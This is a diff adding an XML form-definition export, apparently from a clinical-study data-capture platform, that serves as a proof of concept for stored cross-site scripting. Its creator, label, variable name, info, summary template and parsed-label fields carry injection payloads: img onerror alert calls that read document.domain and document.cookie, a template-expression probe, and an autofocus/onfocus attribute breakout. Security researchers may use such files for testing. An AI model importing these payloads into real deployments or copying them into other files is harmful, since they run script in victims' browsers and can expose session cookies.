@@ -1,0 +1,67 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<xml>
+  <crf_id>12199897-72BF-45F4-B0F7-981C31833D31</crf_id>
+  <optionLists/>
+  <version>3</version>
+  <metadata>1</metadata>
+  <date_created>2020-12-31 07:23:53</date_created>
+  <created_by>#['-alert(document.domain)-'] {{ 1+1 }} world"+onfocus=alert(1)+autofocus=" (experimentyt1@gmail.com)</created_by>
+  <lookupTable/>
+  <study name="Study" guid="study">
+    <phases>
+      <ph_408C7FC6-6B36-4715-A915-82DCB9E03B74 name="POC" guid="408C7FC6-6B36-4715-A915-82DCB9E03B74" duration="" order="1" rejected="0" stepCount="1">
+        <steps>
+          <st_723A3915-3E61-4CB8-B14F-BF98B4BA4B68 step_id="723A3915-3E61-4CB8-B14F-BF98B4BA4B68" study_phase_id="408C7FC6-6B36-4715-A915-82DCB9E03B74" step_number="1" step_name="xxs" step_desc="" step_status="active" name="xxs" guid="723A3915-3E61-4CB8-B14F-BF98B4BA4B68" rejected="0">
+            <fields>
+              <fi_7B3E0304-FAC1-4589-9A25-F7549AC16BAD>
+                <parent_id>723A3915-3E61-4CB8-B14F-BF98B4BA4B68</parent_id>
+                <field_id>7B3E0304-FAC1-4589-9A25-F7549AC16BAD</field_id>
+                <field_number>0</field_number>
+                <field_number_display>1</field_number_display>
+                <field_label>xxs `&lt;img src=x onerror=alert(document.domain)&gt;</field_label>
+                <field_is_alias>0</field_is_alias>
+                <field_variable_name>&lt;img src=x onerror=alert('xxsed_by_rootz')&gt;</field_variable_name>
+                <field_type>calculation</field_type>
+                <field_type_description>Calculation</field_type_description>
+                <field_option_group></field_option_group>
+                <field_custom_type></field_custom_type>
+                <field_required>0</field_required>
+                <field_required_description>Not required</field_required_description>
+                <field_min></field_min>
+                <field_max></field_max>
+                <field_min_label></field_min_label>
+                <field_max_label></field_max_label>
+                <field_length></field_length>
+                <field_inclusion></field_inclusion>
+                <field_units></field_units>
+                <field_info>`&lt;img src=x onerror=alert('xxsed_by_rootz')&gt;</field_info>
+                <field_summary_template>&lt;img src=x onerror=alert('xxsed_by_rootz')&gt;</field_summary_template>
+                <updated_by>EE37CBE8-B187-EA80-11C8-D0CAF83F8DD9</updated_by>
+                <updated_on>2020-12-31 06:52:43</updated_on>
+                <field_visibility></field_visibility>
+                <field_value></field_value>
+                <option_groups></option_groups>
+                <show_validation></show_validation>
+                <show_validation_type></show_validation_type>
+                <field_image></field_image>
+                <field_slider_step></field_slider_step>
+                <exclude_on_data_export>0</exclude_on_data_export>
+                <field_hidden>0</field_hidden>
+                <encryption_enabled>false</encryption_enabled>
+                <searchability_enabled>false</searchability_enabled>
+                <report_id></report_id>
+                <survey_package_id></survey_package_id>
+                <additional_config></additional_config>
+                <dependencyChilds/>
+                <dependencyParents/>
+                <validation/>
+                <field_label_parsed>&amp;lt;img src=x onerror=alert(document.cookie)&amp;gt;</field_label_parsed>
+              </fi_7B3E0304-FAC1-4589-9A25-F7549AC16BAD>
+            </fields>
+          </st_723A3915-3E61-4CB8-B14F-BF98B4BA4B68>
+        </steps>
+      </ph_408C7FC6-6B36-4715-A915-82DCB9E03B74>
+    </phases>
+  </study>
+  <export_type>field</export_type>
+</xml>
